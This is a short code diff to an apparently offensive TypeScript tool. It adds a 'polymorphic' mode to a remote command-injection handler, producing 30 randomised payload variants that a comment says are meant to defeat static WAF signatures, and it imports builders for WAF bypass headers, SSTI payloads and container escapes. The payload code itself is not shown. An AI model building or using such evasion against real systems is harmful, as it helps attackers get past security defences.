@@ -3,6 +3,7 @@ import { sshStreamExec, type SshOptions } from "../lib/sshExec.js";
 import {
   applyQuantumBypass,
   buildPayloadVariants,
+  buildPolymorphicPayload,
   buildHttpBypassHeaders,
   buildWafSpecificHeaders,
   buildSSTIPayloads,
@@ -372,6 +373,10 @@ async function handleRemoteInject(
     payloadVariants = buildCloudMetaPayloads(originalCmd);
   } else if (mode === "container") {
     payloadVariants = buildContainerEscapes(originalCmd);
+  } else if (mode === "polymorphic") {
+    // Generate 30 unique polymorphic variants — each call produces a different
+    // byte sequence (random junk variables + random encoding), defeating static WAF sigs
+    payloadVariants = Array.from({ length: 30 }, () => buildPolymorphicPayload(originalCmd, "quantum"));
   } else {
     payloadVariants = buildPayloadVariants(processed);
   }
